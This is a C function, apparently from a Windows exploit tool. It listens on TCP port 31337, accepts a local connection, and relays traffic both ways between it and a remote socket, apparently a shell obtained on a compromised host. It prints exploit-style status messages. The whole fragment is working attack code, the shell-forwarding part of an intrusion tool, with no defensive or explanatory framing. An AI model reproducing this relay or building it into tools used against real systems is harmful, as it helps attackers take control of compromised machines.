
VOID read_shell(SOCKET remote)
{
	SOCKET srv, local = 0, from, to, high; 
	struct sockaddr_in s;
	CHAR buf[8192];
	int on = 1, bytes;
	fd_set fdread;
	struct timeval tv;
	char passphrase[9];


	fflush(stdout);


	do
	{
		if ((srv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		{
			printf("socket\n");
			break;
		}

		s.sin_family      = AF_INET;
		s.sin_port        = htons(31337);
		s.sin_addr.s_addr = INADDR_ANY;

		setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on));

		if (bind(srv, (struct sockaddr *)&s, sizeof(s)) < 0)
		{
			printf("bind\n");
			break;
		}

		if (listen(srv, 1) < 0)
		{
			printf("listen\n");
			break;
		}

		local = accept(srv, NULL, NULL);

	} while (0);

	high = local;
	
	if (remote > high)
		high = remote;

	printf("[*] Forwarding local=%d<->remote=%d...\n", local, remote);

	while ((local) && (remote))
	{
		FD_ZERO(&fdread);
		FD_SET(local, &fdread);
		FD_SET(remote, &fdread);

		tv.tv_sec = 1;
		tv.tv_usec = 0;

		if (select(high + 1, &fdread, NULL, NULL, &tv) < 0)
			break;
		
		if (FD_ISSET(remote, &fdread))
		{
			from  = remote;
			to    = local;
		}
		else
		{
			from  = local;
			to    = remote;
		}

		ioctlsocket(from, FIONREAD, &bytes);

		if ((bytes = recv(from, buf, sizeof(buf), 0)) <= 0)
			break;
		
		if (send(to, buf, bytes, 0) < 0)
		{
			printf("send failed, %lu\n", GetLastError());
			break;
		}
	}

	printf("[*] Finished\n");
}
